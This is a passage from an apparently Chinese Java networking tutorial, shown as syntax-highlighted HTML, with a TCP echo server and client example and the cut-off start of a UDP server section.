&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.charset.StandardCharsets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServerSocket&lt;/span> &lt;span style="color:#111">ss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ServerSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">6980&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Server is running...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ss&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected from &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRemoteSocketAddress&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Thread&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">ioe&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Client disconnected&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye~\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Socket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 连接指定服务器和端口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;disconnected.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[server] &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 打印提示
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// 读取一行输入
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;&amp;lt;&amp;lt; &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">resp&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意&lt;code>flush()&lt;/code>，不然可能都收不到消息&lt;/p>
&lt;h3 id="socket---udp">Socket - UDP&lt;/h3>
&lt;p>Server&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DatagramSocket&lt;/span> &lt;span style="color:#111">ds&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 监听指定端口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 无限循环
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 数据缓冲区:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">buffer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">1024&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DatagramPacket&lt;/span> &lt;span style="color:#111">packet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">DatagramPacket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">buffer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
